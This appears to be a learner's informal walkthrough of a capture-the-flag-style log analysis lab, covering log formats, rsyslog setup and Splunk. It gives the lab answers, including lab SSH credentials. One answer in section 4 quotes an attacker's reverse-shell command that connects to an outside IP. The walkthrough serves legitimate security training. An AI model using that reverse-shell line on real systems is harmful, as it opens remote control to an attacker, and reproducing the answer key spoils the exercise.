1.Introduction

This room covers how logs can be used to record an adversary's actions, the tools and techniques needed to perform log analysis, 
and the significance of effectively collecting and analysing logs.
Understand the importance of logs as a historical activity record for identifying and mitigating potential threats.
Explore various types of logs, logging mechanisms and collection methods across multiple platforms.
Gain hands-on experience detecting and defeating adversaries through log analysis.

2.Expanding Perspectives: Logs as Evidence of Historical Activity

Start the Machine for Split View or connect with ssh user damianhall password Logs321!

Use sudo -l to see what damianhall can use

Logs are a record of events within a system

Answers:Perry,/var/log/gitlab/nginx/access.log

3.Types, Formats, and Standards

Since we are talking about a nginix that is a web server a web server log is what we search and in this case its the 
NCSA Combined Log Format.

Answer:Web Server Log,Combined

4.Collection, Management, and Centralisation

Sounds like a good tool for working with logs.
Splunk is a platform for collecting, storing, and analysing machine data. It provides various tools for analysing data, 
including search, correlation, and visualisation. It is a powerful tool that organisations of all sizes can use to 
improve their IT operations and security posture.

The configuration part:

nano /etc/rsyslog.d/98-websrv-02-sshd.conf

Here be careful to write it like this else the log file never gonna appear

$FileCreateMode 0644
:programname, isequal, "sshd" /var/log/websrv-02/rsyslog_sshd.log

sudo systemctl restart rsyslog

ssh localhost 
(password is Logs321!)

Compare the ip of stansimon (34.253.159.159) then you onna find which command he trys to run

Answer:stansimon,10.10.10.101,/bin/bash -c "/bin/bash -i >& /dev/tcp/34.253.159.159/9999 0>&1"

5.Storage, Retention, and Deletion

Try to use ssh connection to the machine because since i cant copy paste the code its really a pain to type so much

Gonna continue on the next day(Day 5) and dont make the mistake like me closing the AttackBox while you are connected with ssh 
because it closes the connection ... its late haha, mistakes happen and the next day i can try again ;)
